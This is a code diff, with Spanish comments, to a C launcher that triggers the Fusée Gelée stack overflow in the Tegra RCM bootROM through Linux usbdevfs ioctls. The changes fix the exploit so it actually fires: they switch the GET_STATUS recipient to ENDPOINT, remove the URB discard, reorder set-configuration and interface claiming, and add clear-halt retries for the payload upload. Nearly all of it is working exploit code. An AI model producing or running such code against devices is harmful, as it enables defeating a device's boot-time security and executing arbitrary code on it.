@@ -31,7 +31,10 @@ static int trigger_exploit(int fd, int length, int mode) {
     struct usbdevfs_urb *purb = nullptr;
 
     struct usb_ctrlrequest *ctrl_req = (struct usb_ctrlrequest *) buffer;
-    ctrl_req->bRequestType = USB_DIR_IN | USB_RECIP_INTERFACE;
+    // CRITICO: el PoC oficial (ktemkin) dispara el overflow con recipient ENDPOINT
+    // (0x82). GET_STATUS + INTERFACE (0x81, como NXLoader) NO esta en la lista de
+    // handlers vulnerables del bootROM — el overflow del stack no desencadena.
+    ctrl_req->bRequestType = USB_DIR_IN | USB_RECIP_ENDPOINT;
     ctrl_req->bRequest = USB_REQ_GET_STATUS;
     ctrl_req->wLength = length;
 
@@ -46,7 +49,7 @@ static int trigger_exploit(int fd, int length, int mode) {
         // Variante control sincrono: USBDEVFS_CONTROL (el setup viaja seguro,
         // el overflow ocurre en el device al procesar el wLength gigante).
         struct usbdevfs_ctrltransfer ctrl = {};
-        ctrl.bRequestType = USB_DIR_IN | USB_RECIP_INTERFACE;
+        ctrl.bRequestType = USB_DIR_IN | USB_RECIP_ENDPOINT;
         ctrl.bRequest = USB_REQ_GET_STATUS;
         ctrl.wValue = 0;
         ctrl.wIndex = 0;
@@ -58,17 +61,12 @@ static int trigger_exploit(int fd, int length, int mode) {
         return r < 0 ? -5 : 0;
     }
 
+    // PoC oficial (ktemkin, report/fusee_gelee.md): SOLO SUBMITURB — el setup
+    // packet viaja al device en el momento del submit y el overflow ocurre en el
+    // device. NO hacer DISCARDURB: en Linux desktop la cancelacion gana la carrera
+    // y el setup nunca se transmite (el error de NXLoader/Android no aplica aca).
+    // No esperar completacion: el device murio; cerrar el fd cancela el URB.
     if (ioctl(fd, USBDEVFS_SUBMITURB, &urb) < 0) { free(buffer); return -1; }
-    if (mode != 2) {
-        // modo 0 (normal, como NXLoader): DISCARDURB inmediato
-        if (ioctl(fd, USBDEVFS_DISCARDURB, &urb) < 0) { free(buffer); return -2; }
-    } else {
-        // modo 2 (sin discard): dejamos que el URB se complete solo;
-        // el device procesa el GET_STATUS y el overflow ocurre.
-        usleep(200000);
-    }
-    if (ioctl(fd, USBDEVFS_REAPURB, &purb) < 0) { free(buffer); return -3; }
-    if (purb->usercontext != (void *) 0x1337) { free(buffer); return -4; }
     free(buffer);
     return 0;
 }
@@ -98,17 +96,43 @@ int main(int argc, char **argv) {
 
     int fd = open(dev_path, O_RDWR);
     if (fd < 0) { fprintf(stderr, "[-] no se pudo abrir %s: %s\n", dev_path, strerror(errno)); return 1; }
+    int r = 0;
+
+    // IMPORTANTE: SETCONFIGURATION debe ir ANTES de CLAIMINTERFACE.
+    // El kernel (devio.c: proc_setconfig) rechaza el ioctl con -EBUSY si
+    // CUALQUIER interfaz esta actualmente claimeada (sin importar por que fd),
+    // asi que llamarlo despues de CLAIMINTERFACE fallaba en silencio (el
+    // codigo no chequeaba el valor de retorno) y el "reset barato" que hace
+    // el kernel cuando el config pedido ya es el activo (usb_reset_configuration,
+    // que limpia toggles/halt de los endpoints) nunca se ejecutaba. Esto es lo
+    // que pyusb hace bien: set_configuration() se llama antes de claimear.
+    int cfg = 1;
+    if (ioctl(fd, USBDEVFS_SETCONFIGURATION, &cfg) < 0) {
+        fprintf(stderr, "[!] set_configuration fallo (no fatal): %s\n", strerror(errno));
+    }
 
     unsigned int ifnum = 0;
     if (ioctl(fd, USBDEVFS_CLAIMINTERFACE, &ifnum) < 0) {
         fprintf(stderr, "[-] claim interface fallo: %s\n", strerror(errno));
         return 1;
     }
+
+    // Ahora si el endpoint quedo con un STALL real (no cubierto por el
+    // reset de configuracion anterior), lo limpiamos.
+    unsigned int ep_in = 0x81;
+    unsigned int ep_out = 0x01;
+    ioctl(fd, USBDEVFS_CLEAR_HALT, &ep_in);
+    ioctl(fd, USBDEVFS_CLEAR_HALT, &ep_out);
     printf("[+] interface reclamada (%s)\n", dev_path);
 
     /* Step 1: leer device ID (bulk IN, endpoint 0x81) */
     uint8_t device_id[16] = {};
-    int r = bulk_transfer(fd, 0x81, device_id, 16, 999);
+    r = bulk_transfer(fd, 0x81, device_id, 16, 999);
+    if (r < 0 && errno == EPIPE) {
+        // endpoint stalled: clear halt y reintentar (como libusb)
+        ioctl(fd, USBDEVFS_CLEAR_HALT, &ep_in);
+        r = bulk_transfer(fd, 0x81, device_id, 16, 999);
+    }
     if (r != 16) { fprintf(stderr, "[-] fallo al leer device ID (%d): %s\n", r, strerror(errno)); return 1; }
     printf("[+] Device ID: ");
     for (int i = 0; i < 16; i++) printf("%02x", device_id[i]);
@@ -151,7 +175,17 @@ int main(int argc, char **argv) {
     size_t bytes_sent = 0;
     for (; bytes_sent < unpadded_length || low_buffer; bytes_sent += 0x1000) {
         memcpy(chunk, buf + bytes_sent, 0x1000);
-        r = bulk_transfer(fd, 0x01, chunk, 0x1000, 999);
+        int attempts = 0;
+        do {
+            r = bulk_transfer(fd, 0x01, chunk, 0x1000, 999);
+            if (r < 0 && errno == EPIPE && attempts < 5) {
+                // endpoint OUT stalled: clear halt y reintentar (como libusb)
+                ioctl(fd, USBDEVFS_CLEAR_HALT, &ep_out);
+                attempts++;
+                continue;
+            }
+            break;
+        } while (true);
         if (r != 0x1000) {
             fprintf(stderr, "[-] envio fallo en offset %zu (%d): %s\n", bytes_sent, r, strerror(errno));
             return 1;
